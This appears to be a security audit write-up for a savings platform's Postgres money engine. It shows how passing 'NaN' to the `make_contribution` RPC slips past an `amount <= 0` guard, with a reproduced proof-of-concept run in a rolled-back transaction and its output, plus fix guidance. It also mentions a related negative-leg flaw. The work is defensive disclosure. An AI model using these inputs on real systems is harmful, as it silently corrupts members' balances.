# A04-001 — proven live, 2026-08-25

The audit's most severe finding, reproduced end-to-end against the live database inside
`BEGIN … ROLLBACK`. Nothing was committed; `s-0001` was re-checked afterwards and is unchanged,
and live contains zero NaN rows.

## The Postgres behaviour the guard relies on

```sql
select 'NaN'::numeric <= 0, 'NaN'::numeric > 0, 'NaN'::numeric = 'NaN'::numeric, 'NaN'::numeric > 1e9;
--        f                    t                   t                              t
```

In Postgres, `NaN` sorts **greater than every other numeric**. So `NaN <= 0` is **FALSE** —
unlike IEEE-754 and unlike every language a developer's intuition comes from, where NaN
comparisons are all false. A guard that reads perfectly correctly is therefore inert against it.

## The guard

`public.make_contribution`, line 24:

```sql
IF p_amount IS NULL OR p_amount <= 0 THEN
  RAISE EXCEPTION 'amount must be positive' USING ERRCODE = 'P0001';
END IF;
```

`NaN IS NULL` → false. `NaN <= 0` → false. The exception never fires.

## The exploit, as run

```sql
BEGIN;
SET LOCAL ROLE authenticated;
SET LOCAL request.jwt.claims =
  '{"app_role":"subscriber","subscriberId":"s-0001","sub":"s-0001","role":"authenticated"}';

SELECT units, total_balance FROM subscriber_balances WHERE subscriber_id='s-0001';
--  units 897.9839115963516446 | total_balance 1411092

SELECT public.make_contribution('nan-probe-…', 'NaN'::numeric, 80, 'MTN Mobile Money');
```

The RPC **succeeds** and returns a settled transaction:

```json
{"id":"tx-s-0001-adhoc-7f4e…","type":"contribution","amount":"NaN","status":"settled",
 "method":"MTN Mobile Money","splitEmergency":"NaN","splitRetirement":"NaN","reference":"CT-195573"}
```

Balances afterwards:

```
 units | total_balance | retirement_units | emergency_units
-------+---------------+------------------+-----------------
   NaN |           NaN |              NaN |             NaN
```

```sql
ROLLBACK;
```

## Why this is the worst finding in the report

- **Any authenticated subscriber can do it.** No special role, no admin path — it is the ordinary
  contribution RPC, reachable from the member's own app.
- **It is silent.** No error, no failed request. The transaction is marked `settled` and the
  member's app renders a normal-looking receipt.
- **It is irrecoverable in practice.** NaN propagates through every `SUM`, so one poisoned row
  takes out that member's balance, the branch rollup, the distributor rollup and platform AUM.
  There is no arithmetic undo — only a restore from backup, on a free tier with no PITR.
- **`units` is the ledger.** With NAV pricing live, `units` is what the member actually owns.
  NaN units means the member's holding no longer has a value at all.

## What the fix must handle

A patch that only checks `p_amount <= 0` more carefully is not enough. The guard must
**explicitly reject NaN** (and Infinity), e.g. `p_amount IS NULL OR NOT (p_amount > 0) OR
p_amount = 'NaN'::numeric` — note `NOT (p_amount > 0)` correctly rejects NaN where
`p_amount <= 0` does not.

The same trap applies to every other numeric guard in the money engine. `P3-money-validator`
owns one shared numeric guard across `make_contribution`, `request_withdrawal` and
`submit_employer_contribution_run` — it must be NaN-aware in all three, and the CHECK constraints
added to `subscriber_balances` must reject NaN too, or the constraint will happily accept it.

Related, same agent: **A04-002** — legs are only checked to *sum*, so a negative leg paired with
a larger positive one passes and creates money.
